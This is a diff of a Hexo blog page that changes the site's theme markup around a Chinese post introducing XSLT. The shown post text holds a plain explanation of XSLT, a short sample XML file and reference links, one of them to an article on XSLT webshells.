EEIIIYQ8Er7sEEIIIYQQQh4JX3YIIYQQQgghj4QvO4QQQgghhJBHwpcdQgghhBBCyCPhyw4hhBBCCCHkkfBlhxBCCCGEEPJI+LJDCCGEEEIIeSR82SGEEEIIIYQ8Er7sEEIIIYQQQh4JX3YIIYQQQgghj4QvO4QQQgghhJBHwpcdQgghhBBCyCPhyw4hhBBCCCHkkfBlhxBCCCGEEPJI+LJDCCGEEEIIeSCfn/8PeILHOxduQowAAAAASUVORK5CYII=">
@@ -113,231 +31,319 @@
 <meta name="twitter:title" content="认识xslt">
 <meta name="twitter:description" content="什么是XSLT可扩展样式表语言转换(XSLT)是一种基于XML的语言，和专门的处理软件一起使用，用于XML文档转换。虽然这个处理过程被称作“转换”，但并没有改变原始文档，而是在原文档内容的基础上创建了一个新的XML文档。然后, 这个新文档会被处理器序列化（输出）为标准的XML语法或其他格式，如HTML或纯文本。XSLT最常用于不同XML模式间的数据转换，或用于将XML数据转换为网页或PDF文档 就">
 <meta name="twitter:image" content="data:image/png;base64,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">
+    
+    
+        
+    
+    
+    
+    
+    
+    <!--STYLES-->
+    <link rel="stylesheet" href="/assets/css/style-6tgl0yz7lnfzkusrxanjzjinweinxlhwhjly7phr1vxoylo39j7uvbjbwsfg.min.css">
+    <!--STYLES END-->
+    
 
+    
 
-
-<script type="text/javascript" id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Muse',
-    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
-    fancybox: true,
-    tabs: true,
-    motion: true,
-    duoshuo: {
-      userId: '0',
-      author: 'Author'
-    },
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
-
-  <link rel="canonical" href="http://yoursite.com/2019/11/18/认识xslt/">
-
-
-
-
-
-  <title>认识xslt | Hexo</title>
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+    
+        
+    
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh">
+    <body>
+        <div id="blog">
+            <!-- Define author's picture -->
 
-  
-  
-    
-  
 
-  <div class="container sidebar-position-left page-post-detail ">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta ">
     
 
-    <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Hexo</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
+<header id="header" data-behavior="4">
+    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+    <div class="header-title">
+        <a
+            class="header-title-link"
+            href="/ "
+            aria-label=""
+        >
+            Hexo
+        </a>
     </div>
-      
-        <p class="site-subtitle"></p>
-      
-  </div>
-
-  <div class="site-nav-toggle">
-    <button>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
-</div>
-
-<nav class="site-nav">
-  
-
-  
-    <ul id="menu" class="menu">
-      
+    
         
-        <li class="menu-item menu-item-home">
-          <a href="/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
-            
-            Home
-          </a>
-        </li>
-      
+            <a
+                class="header-right-picture "
+                href="#about"
+                aria-label="打开链接: /#about"
+            >
         
-        <li class="menu-item menu-item-archives">
-          <a href="/archives/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
-            
-            Archives
-          </a>
-        </li>
-      
         
-        <li class="menu-item menu-item-tags">
-          <a href="/tags/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
-            
-            Tags
-          </a>
-        </li>
-      
+        </a>
+    
+</header>
 
-      
-    </ul>
-  
+            <!-- Define author's picture -->
 
-  
+
+<nav id="sidebar" data-behavior="4">
+    <div class="sidebar-container">
+        
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/"
+                            
+                            rel="noopener"
+                            title="首页"
+                        >
+                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">首页</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-categories"
+                            
+                            rel="noopener"
+                            title="分类"
+                        >
+                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">分类</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-tags"
+                            
+                            rel="noopener"
+                            title="标签"
+                        >
+                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">标签</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-archives"
+                            
+                            rel="noopener"
+                            title="归档"
+                        >
+                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">归档</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link open-algolia-search"
+                            href="#search"
+                            
+                            rel="noopener"
+                            title="搜索"
+                        >
+                        <i class="sidebar-button-icon fa fa-search" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">搜索</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="#about"
+                            
+                            rel="noopener"
+                            title="关于"
+                        >
+                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">关于</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://github.com/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="GitHub"
+                        >
+                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">GitHub</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="http://stackoverflow.com/users"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Stack Overflow"
+                        >
+                        <i class="sidebar-button-icon fab fa-stack-overflow" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Stack Overflow</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://twitter.com/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Twitter"
+                        >
+                        <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Twitter</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://facebook.com/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Facebook"
+                        >
+                        <i class="sidebar-button-icon fab fa-facebook" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Facebook</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://plus.google.com/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Google Plus"
+                        >
+                        <i class="sidebar-button-icon fab fa-google-plus" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Google Plus</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://www.linkedin.com/profile/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="LinkedIn"
+                        >
+                        <i class="sidebar-button-icon fab fa-linkedin" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">LinkedIn</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/mailto"
+                            
+                            rel="noopener"
+                            title="邮箱"
+                        >
+                        <i class="sidebar-button-icon fa fa-envelope" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">邮箱</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/atom.xml"
+                            
+                            rel="noopener"
+                            title="RSS"
+                        >
+                        <i class="sidebar-button-icon fa fa-rss" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">RSS</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+    </div>
 </nav>
 
-
-
- </div>
-    </header>
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          <div id="content" class="content">
             
-
-  <div id="posts" class="posts-expand">
+            <div id="main" data-behavior="4"
+                 class="
+                        hasCoverMetaIn
+                        ">
+                
+<article class="post">
     
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/18/认识xslt/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
     
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">认识xslt</h1>
-        
-
+        <div class="post-header main-content-wrap text-left">
+    
+        <h1 class="post-title">
+            认识xslt
+        </h1>
+    
+    
         <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-11-18T19:39:36+08:00">
-                2019-11-18
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
+    <time datetime="2019-11-18T19:39:36+08:00">
+	
+		    11月 18, 2019
+    	
+    </time>
     
+</div>
 
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
+</div>
 
-      
-      
-
-      
-        <h2 id="什么是XSLT"><a href="#什么是XSLT" class="headerlink" title="什么是XSLT"></a>什么是XSLT</h2><p><strong>可扩展样式表语言转换(XSLT)</strong>是一种基于<a href="https://developer.mozilla.org/zh-CN/docs/Web/cn/XML" target="_blank" rel="noopener">XML</a>的语言，和专门的处理软件一起使用，用于XML文档转换。虽然这个处理过程被称作“转换”，但并没有改变原始文档，而是在原文档内容的基础上创建了一个新的XML文档。然后, 这个新文档会被处理器序列化（输出）为标准的XML语法或其他格式，如<a href="https://developer.mozilla.org/zh-CN/docs/Web/cn/HTML" target="_blank" rel="noopener">HTML</a>或纯文本。XSLT最常用于不同XML模式间的数据转换，或用于将XML数据转换为网页或PDF文档</p>
+    
+    <div class="post-content markdown">
+        <div class="main-content-wrap">
+            <h2 id="什么是XSLT"><a href="#什么是XSLT" class="headerlink" title="什么是XSLT"></a>什么是XSLT</h2><p><strong>可扩展样式表语言转换(XSLT)</strong>是一种基于<a href="https://developer.mozilla.org/zh-CN/docs/Web/cn/XML" target="_blank" rel="noopener">XML</a>的语言，和专门的处理软件一起使用，用于XML文档转换。虽然这个处理过程被称作“转换”，但并没有改变原始文档，而是在原文档内容的基础上创建了一个新的XML文档。然后, 这个新文档会被处理器序列化（输出）为标准的XML语法或其他格式，如<a href="https://developer.mozilla.org/zh-CN/docs/Web/cn/HTML" target="_blank" rel="noopener">HTML</a>或纯文本。XSLT最常用于不同XML模式间的数据转换，或用于将XML数据转换为网页或PDF文档</p>
 <p>就是说XSLT 可以把 XML文档转换为其他类型的文档</p>
 <h3 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h3><p>1.xml写入</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type="text/xsl" href="1.xsl"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>China<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>abc<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
@@ -425,330 +431,315 @@
 <p><a href="https://skysec.top/2018/08/18/%E6%B5%85%E6%9E%90xml%E4%B9%8Bxinclude-xslt/#XSLT" target="_blank" rel="noopener">https://skysec.top/2018/08/18/%E6%B5%85%E6%9E%90xml%E4%B9%8Bxinclude-xslt/#XSLT</a></p>
 <p><a href="https://paper.seebug.org/36/#xsltwebshell" target="_blank" rel="noopener">https://paper.seebug.org/36/#xsltwebshell</a></p>
 
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
